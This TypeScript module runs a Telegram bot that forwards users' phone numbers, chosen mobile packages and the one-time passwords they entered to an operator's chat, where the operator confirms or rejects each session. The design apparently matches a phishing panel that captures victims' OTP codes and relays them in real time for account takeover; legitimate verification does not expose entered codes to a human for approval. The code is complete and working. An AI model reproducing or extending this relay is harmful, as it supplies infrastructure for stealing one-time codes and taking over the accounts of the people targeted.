import { logger } from "./logger";
import { db, sessionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const BASE = `https://api.telegram.org/bot${TOKEN}`;

async function apiCall(method: string, body: Record<string, unknown>): Promise<Record<string, unknown>> {
  const res = await fetch(`${BASE}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const data = await res.json() as Record<string, unknown>;
  if (!data["ok"]) {
    logger.warn({ method, response: data }, "Telegram API call failed");
  }
  return data;
}

export async function sendMessage(text: string, replyMarkup?: unknown): Promise<void> {
  if (!TOKEN || !CHAT_ID) return;
  const body: Record<string, unknown> = {
    chat_id: CHAT_ID,
    text,
    parse_mode: "Markdown",
  };
  if (replyMarkup) body["reply_markup"] = replyMarkup;
  await apiCall("sendMessage", body);
}

async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
  await apiCall("answerCallbackQuery", { callback_query_id: callbackQueryId, text });
}

async function editMessageText(messageId: number, text: string, replyMarkup?: unknown): Promise<void> {
  if (!TOKEN || !CHAT_ID) return;
  const body: Record<string, unknown> = {
    chat_id: CHAT_ID,
    message_id: messageId,
    text,
    parse_mode: "Markdown",
  };
  if (replyMarkup) body["reply_markup"] = replyMarkup;
  await apiCall("editMessageText", body);
}

export function buildOtpKeyboard(sessionId: string): unknown {
  return {
    inline_keyboard: [[
      { text: "✅ Confirmer", callback_data: `confirm:${sessionId}` },
      { text: "❌ Rejeter", callback_data: `reject:${sessionId}` },
    ]],
  };
}

// ---------------------------------------------------------------------------
// Long-polling loop
// ---------------------------------------------------------------------------

let offset = 0;
let active = false;

interface TelegramUpdate {
  update_id: number;
  callback_query?: {
    id: string;
    data?: string;
    message?: { message_id: number };
  };
}

async function poll(): Promise<void> {
  if (!active) return;

  try {
    const res = await fetch(
      `${BASE}/getUpdates?offset=${offset}&timeout=25&allowed_updates=["callback_query"]`,
      { signal: AbortSignal.timeout(30_000) },
    );
    const payload = await res.json() as { ok: boolean; result?: TelegramUpdate[] };

    if (payload.ok && payload.result) {
      for (const update of payload.result) {
        offset = update.update_id + 1;
        await handleUpdate(update);
      }
    }
  } catch (err) {
    logger.error({ err }, "Telegram polling error");
    await new Promise((r) => setTimeout(r, 3000));
  }

  if (active) setTimeout(poll, 200);
}

async function handleUpdate(update: TelegramUpdate): Promise<void> {
  if (!update.callback_query) return;

  const { id: cbId, data: cbData, message } = update.callback_query;
  if (!cbData) return;

  const colonIdx = cbData.indexOf(":");
  if (colonIdx === -1) return;

  const action = cbData.slice(0, colonIdx);
  const sessionId = cbData.slice(colonIdx + 1);

  const rows = await db
    .select()
    .from(sessionsTable)
    .where(eq(sessionsTable.id, sessionId));

  const session = rows[0];
  if (!session) {
    await answerCallbackQuery(cbId, "Session introuvable");
    return;
  }

  if (action === "confirm") {
    await db
      .update(sessionsTable)
      .set({ status: "verified" })
      .where(eq(sessionsTable.id, sessionId));

    await answerCallbackQuery(cbId, "✅ OTP confirmé — utilisateur connecté");

    if (message?.message_id) {
      await editMessageText(
        message.message_id,
        `✅ *OTP CONFIRMÉ*\n\n📱 Téléphone: \`${session.phone}\`\n📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n🔢 OTP: \`${session.enteredOtp ?? "?"}\`\n\n_Utilisateur connecté avec succès._`,
      );
    }
    logger.info({ sessionId }, "Session verified by admin");

  } else if (action === "reject") {
    await db
      .update(sessionsTable)
      .set({ status: "rejected" })
      .where(eq(sessionsTable.id, sessionId));

    await answerCallbackQuery(cbId, "❌ OTP rejeté");

    if (message?.message_id) {
      await editMessageText(
        message.message_id,
        `❌ *OTP REJETÉ*\n\n📱 Téléphone: \`${session.phone}\`\n📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n🔢 OTP: \`${session.enteredOtp ?? "?"}\``,
      );
    }
    logger.info({ sessionId }, "Session rejected by admin");
  }
}

export function startPolling(): void {
  if (!TOKEN || !CHAT_ID) {
    logger.warn("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — notifications disabled");
    return;
  }
  active = true;
  logger.info("Telegram bot polling started");
  poll();
}
